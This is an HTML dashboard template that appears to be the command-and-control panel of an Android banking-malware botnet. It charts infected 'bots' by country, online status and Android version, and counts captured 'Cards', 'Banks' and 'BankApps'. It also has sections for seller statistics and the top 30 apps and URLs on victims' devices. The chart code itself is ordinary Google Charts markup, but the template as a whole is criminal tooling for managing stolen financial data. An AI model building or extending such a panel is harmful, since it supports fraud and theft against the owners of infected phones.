<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
            <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">poll</i>Total bots: %%PLACE_TOTAL_BOTS_COUNT%%</h5>
</div>

<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" >
<br>
<div>
	<h5>Country statistics</h5>
	<div id="pie-chart"></div>
	<script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
		function drawCharts() {
			var pieData = google.visualization.arrayToDataTable([
		    ['Country', 'Bots'],
		    %%PLACE_MYDATA_HERE%%
		  ]);
		  // pie chart options
		  var pieOptions = {
		    backgroundColor: 'transparent',
		    pieHole: 0.4,
		    colors: [ "cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray","#39ca74","#e54d42","#f0c330","#3999d8","#35485d", "#FE2E2E", "#B40404", "#610B0B", "#FE9A2E", "#B45F04","#3B240B", "#2EFE2E", "#04B404","#0B610B", "#58FAF4", "#04B4AE","#0B615E", "#FA58F4", "#DF01D7","#610B5E", "#F781BE", "#DF0174","#610B38"],
		    pieSliceText: 'value',
		    tooltip: {
		      text: 'percentage'
		    },
		    fontName: 'Open Sans',
		    chartArea: {
		      width: '100%',
		      height: '94%'
		    },
		    legend: {
		      textStyle: {
		        fontSize: 13
		      }
		    }
		  };
		  // draw bar chart twice so it animates
		  var pieChart = new google.visualization.PieChart(document.getElementById('pie-chart'));
  			pieChart.draw(pieData, pieOptions);
		};
  </script>
</div>
<div>
	<h5>Online statistics last hour</h5>
	<div id="pie-chart-online"></div>
	<script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
		function drawCharts() {
			var pieData = google.visualization.arrayToDataTable([
		    ['Status', 'Bots'],
		    ['Online',  %%PLACE_ONLINE_HERE%%],
		    ['Offline',  %%PLACE_OFFLINE_HERE%%]
		  ]);
		  // pie chart options
		  var pieOptions = {
		    backgroundColor: 'transparent',
		    pieHole: 0.4,
		    colors: [ "cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray","#39ca74","#e54d42","#f0c330","#3999d8","#35485d", "#FE2E2E", "#B40404", "#610B0B", "#FE9A2E", "#B45F04","#3B240B", "#2EFE2E", "#04B404","#0B610B", "#58FAF4", "#04B4AE","#0B615E", "#FA58F4", "#DF01D7","#610B5E", "#F781BE", "#DF0174","#610B38"],
		    pieSliceText: 'value',
		    tooltip: {
		      text: 'percentage'
		    },
		    fontName: 'Open Sans',
		    chartArea: {
		      width: '100%',
		      height: '94%'
		    },
		    legend: {
		      textStyle: {
		        fontSize: 13
		      }
		    }
		  };
		  // draw bar chart twice so it animates
		  var pieChart = new google.visualization.PieChart(document.getElementById('pie-chart-online'));
  			pieChart.draw(pieData, pieOptions);
		};
  </script>
</div>
<div>
  <h5>Statistics</h5>
  <div id="bar-chart"></div>
  <script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
	function drawCharts() {
		  var barData = google.visualization.arrayToDataTable([
		    ['Day', 'Count'],
		    ['Cards',  %%PLACE_CARDS_HERE%%],
		    ['Banks',  %%PLACE_BANKS_HERE%%],
		    ['BankApps',  %%PLACE_BANK_APPS_HERE%%]
		  ]);
		  // set bar chart options
		  var barOptions = {
		    focusTarget: 'category',
		    backgroundColor: 'transparent',
		    colors: ['cornflowerblue', 'tomato'],
		    fontName: 'Open Sans',
		    chartArea: {
		      left: 50,
		      top: 10,
		      width: '100%',
		      height: '70%'
		    },
		    bar: {
		      groupWidth: '80%'
		    },
		    hAxis: {
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    vAxis: {
		      minValue: 0,
		      maxValue: 150,
		      baselineColor: '#DDD',
		      gridlines: {
		        color: '#DDD',
		        count: 4
		      },
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    legend: {
		      position: 'bottom',
		      textStyle: {
		        fontSize: 12
		      }
		    },
		    animation: {
		      duration: 1200,
		      easing: 'out',
					startup: true
		    }
		  };
		  // draw bar chart twice so it animates
		  var barChart = new google.visualization.ColumnChart(document.getElementById('bar-chart'));
		  //barChart.draw(barZeroData, barOptions);
		  barChart.draw(barData, barOptions);
		};
  </script>
</div>

<!--<div class="mdl-cell mdl-cell--6-col" style="float: left; width: 300px;">
	<div id="show_online_bots">
		<p id="week"><i style="font-size: 30px;" class="material-icons">view_week</i></p>
		<p id="day"><i style="font-size: 30px;" class="material-icons">today</i></p>
		<p id="lasthour"><i style="font-size: 30px;" class="material-icons">timer</i></p>
		<p id="now"><i style="font-size: 30px;" class="material-icons">sentiment_satisfied</i></p>
		<br><br>
		<i class="material-icons">sentiment_very_dissatisfied</i><p id="die"></p>
	</div>
</div>-->
<br>

<div>
	<h5>Android versions</h5>
	<div id="pie-chart-versions"></div>
	<script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
		function drawCharts() {
			var pieData = google.visualization.arrayToDataTable([
		    ['Version', 'Bots'],
		    %%PLACE_ANDROID_VER_HERE%%
		  ]);
		  // pie chart options
		  var pieOptions = {
		    backgroundColor: 'transparent',
		    pieHole: 0.4,
		    colors: [ "cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray","#39ca74","#e54d42","#f0c330","#3999d8","#35485d", "#FE2E2E", "#B40404", "#610B0B", "#FE9A2E", "#B45F04","#3B240B", "#2EFE2E", "#04B404","#0B610B", "#58FAF4", "#04B4AE","#0B615E", "#FA58F4", "#DF01D7","#610B5E", "#F781BE", "#DF0174","#610B38"],
		    pieSliceText: 'value',
		    tooltip: {
		      text: 'percentage'
		    },
		    fontName: 'Open Sans',
		    chartArea: {
		      width: '100%',
		      height: '94%'
		    },
		    legend: {
		      textStyle: {
		        fontSize: 13
		      }
		    }
		  };
		  // draw bar chart twice so it animates
		  var pieChart = new google.visualization.PieChart(document.getElementById('pie-chart-versions'));
  			pieChart.draw(pieData, pieOptions);
		};
  </script>
</div>

<div>
  <h5>Sellers statistics</h5>
  <div id="bar-chart-sellers"></div>
  <script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
	function drawCharts() {
		  var barData = google.visualization.arrayToDataTable([
		    %%PLACE_SELLERS_CHART_HERE%%
		  ]);
		  // set bar chart options
		  var barOptions = {
		    focusTarget: 'category',
		    backgroundColor: 'transparent',
		    colors: ["cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray"],
		    fontName: 'Open Sans',
		    chartArea: {
		      left: 50,
		      top: 10,
		      width: '100%',
		      height: '70%'
		    },
		    bar: {
		      groupWidth: '80%'
		    },
		    hAxis: {
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    vAxis: {
		      minValue: 0,
		      maxValue: 150,
		      baselineColor: '#DDD',
		      gridlines: {
		        color: '#DDD',
		        count: 4
		      },
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    legend: {
		      position: 'bottom',
		      textStyle: {
		        fontSize: 12
		      }
		    },
		    animation: {
		      duration: 1200,
		      easing: 'out',
					startup: true
		    }
		  };
		  // draw bar chart twice so it animates
		  var barChart = new google.visualization.ColumnChart(document.getElementById('bar-chart-sellers'));
		  //barChart.draw(barZeroData, barOptions);
		  barChart.draw(barData, barOptions);
		};
  </script>
</div>

<div>
  <h5>Top 30 apps</h5>
  <div id="bar-chart-apps"></div>
  <script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
	function drawCharts() {
		  var barData = google.visualization.arrayToDataTable([
		    %%PLACE_APPS_CHART_HERE%%
		  ]);
		  // set bar chart options
		  var barOptions = {
		    focusTarget: 'category',
		    backgroundColor: 'transparent',
		    colors: ["cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray"],
		    fontName: 'Open Sans',
		    chartArea: {
		      left: 50,
		      top: 10,
		      width: '400px',
		      height: '70%'
		    },
		    bar: {
		      groupWidth: '80%'
		    },
		    hAxis: {
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    vAxis: {
		      minValue: 0,
		      maxValue: 150,
		      baselineColor: '#DDD',
		      gridlines: {
		        color: '#DDD',
		        count: 4
		      },
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    legend: {
		      position: 'bottom',
		      textStyle: {
		        fontSize: 12
		      }
		    },
		    animation: {
		      duration: 1200,
		      easing: 'out',
					startup: true
		    }
		  };
		  // draw bar chart twice so it animates
		  var barChart = new google.visualization.ColumnChart(document.getElementById('bar-chart-apps'));
		  //barChart.draw(barZeroData, barOptions);
		  barChart.draw(barData, barOptions);
		};
  </script>
</div>

<div>
  <h5>Top 30 urls</h5>
  <div id="bar-chart-urls"></div>
  <script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
	function drawCharts() {
		  var barData = google.visualization.arrayToDataTable([
		    %%PLACE_HIST_CHART_HERE%%
		  ]);
		  // set bar chart options
		  var barOptions = {
		    focusTarget: 'category',
		    backgroundColor: 'transparent',
		    colors: ["cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray"],
		    fontName: 'Open Sans',
		    chartArea: {
		      left: 50,
		      top: 10,
		      width: '400px',
		      height: '70%'
		    },
		    bar: {
		      groupWidth: '80%'
		    },
		    hAxis: {
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    vAxis: {
		      minValue: 0,
		      maxValue: 150,
		      baselineColor: '#DDD',
		      gridlines: {
		        color: '#DDD',
		        count: 4
		      },
		      textStyle: {
		        fontSize: 11
		      }
		    },
		    legend: {
		      position: 'bottom',
		      textStyle: {
		        fontSize: 12
		      }
		    },
		    animation: {
		      duration: 1200,
		      easing: 'out',
					startup: true
		    }
		  };
		  // draw bar chart twice so it animates
		  var barChart = new google.visualization.ColumnChart(document.getElementById('bar-chart-urls'));
		  //barChart.draw(barZeroData, barOptions);
		  barChart.draw(barData, barOptions);
		};
  </script>
</div>

</div>
